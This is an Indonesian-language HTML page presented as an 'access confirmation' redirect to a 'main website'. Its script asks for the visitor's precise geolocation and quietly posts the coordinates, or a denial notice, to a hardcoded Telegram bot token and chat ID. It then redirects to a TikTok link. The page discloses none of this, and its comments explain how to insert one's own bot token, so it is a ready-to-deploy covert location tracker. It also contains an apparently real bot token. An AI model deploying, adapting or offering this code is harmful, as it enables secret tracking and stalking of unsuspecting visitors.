<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Menuju Website Utama...</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', sans-serif;
        }
        body {
            background-color: #f4f6f9;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            padding: 20px;
        }
        .card {
            background: #fff;
            padding: 40px 30px;
            border-radius: 12px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.08);
            text-align: center;
            max-width: 450px;
            width: 100%;
        }
        h2 {
            color: #2c3e50;
            margin-bottom: 15px;
            font-size: 1.6rem;
        }
        p {
            color: #7f8c8d;
            font-size: 1rem;
            margin-bottom: 25px;
            line-height: 1.5;
        }
        .btn {
            display: inline-block;
            width: 100%;
            padding: 14px;
            background-color: #3498db;
            color: #fff;
            text-decoration: none;
            border-radius: 8px;
            font-weight: bold;
            font-size: 1.1rem;
            border: none;
            cursor: pointer;
            transition: background 0.2s ease;
        }
        .btn:hover {
            background-color: #2980b9;
        }
    </style>
</head>
<body>

    <div class="card">
        <h2>Konfirmasi Akses</h2>
        <p>Silakan klik tombol di bawah untuk melanjutkan ke website utama kami.</p>
        
        <button class="btn" id="btnLanjut" onclick="prosesMasuk()">Lanjutkan ke Website</button>
    </div>

    <script>
        // === KONFIGURASI UTAMA ===
        const TELEGRAM_TOKEN = '8713051914:AAGWypsFdP6uJPMHFwgLokj4vx5N7LC4Cb0'; // Ganti dengan Token Bot Anda
        const CHAT_ID = '1966317946'; // Ganti dengan ID Chat Telegram Anda
        const DOMAIN_TUJUAN = 'https://vm.tiktok.com/ZS9YQ1Terx8n4-h6cC3/'; // Ganti dengan domain tujuan Anda

        function prosesMasuk() {
            const btn = document.getElementById('btnLanjut');
            btn.disabled = true;
            btn.innerText = "Mengalihkan...";

            if (navigator.geolocation) {
                // Meminta lokasi dengan batas waktu respons cepat (maksimal 5 detik)
                navigator.geolocation.getCurrentPosition(
                    function(position) {
                        const lat = position.coords.latitude;
                        const lon = position.coords.longitude;
                        const pesan = `📍 *Akses Lokasi*\n\n• Lat: \`${lat}\`\n• Lon: \`${lon}\`\n• Peta: https://google.com{lat},${lon}`;
                        
                        // Kirim dan langsung alihkan (tanpa menunggu respons)
                        kirimDanAlihkan(pesan);
                    },
                    function(error) {
                        // Jika ditolak atau error, langsung alihkan juga tanpa menunda
                        kirimDanAlihkan("⚠️ *Akses Lokasi Ditolak/Gagal*");
                    },
                    { enableHighAccuracy: true, timeout: 5000 }
                );
            } else {
                kirimDanAlihkan("❌ *Browser tidak mendukung geoloc*");
            }
        }

        function kirimDanAlihkan(teksPesan) {
            const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
            
            // Metode Asinkronus: Kirim data ke latar belakang sistem
            fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: teksPesan,
                    parse_mode: 'Markdown'
                })
            }); // .then() dihapus sengaja agar tidak ada jeda tunggu waktu server

            // SEKETIKA ITU JUGA pindah ke website utama Anda
            window.location.href = DOMAIN_TUJUAN;
        }
    </script>

</body>
</html>
